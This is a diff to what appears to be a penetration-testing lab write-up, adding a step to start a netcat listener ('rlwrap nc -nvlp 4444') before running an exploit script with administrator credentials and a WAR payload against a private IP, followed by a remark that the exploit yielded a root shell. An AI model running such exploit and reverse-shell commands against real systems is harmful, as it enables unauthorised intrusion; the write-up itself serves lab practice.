@@ -248,6 +248,13 @@ Now that we've done that, lets try to run the exploit again, this time with the 
 
 >command:python exploit.py 192.168.118.43 8080 administrator administrator runme.war
 
+Ensure you set your netcat listener before running the command above
+
+>command: rlwrap nc -nvlp 4444
+
+![image](https://user-images.githubusercontent.com/67879936/222647017-a6872200-4dde-499b-ac90-70e2430e0355.png)
+
+oops, I'm having issues here with my pc (not the exploit), so I asked another person to help run on his pc and he got root shell
 
 
 
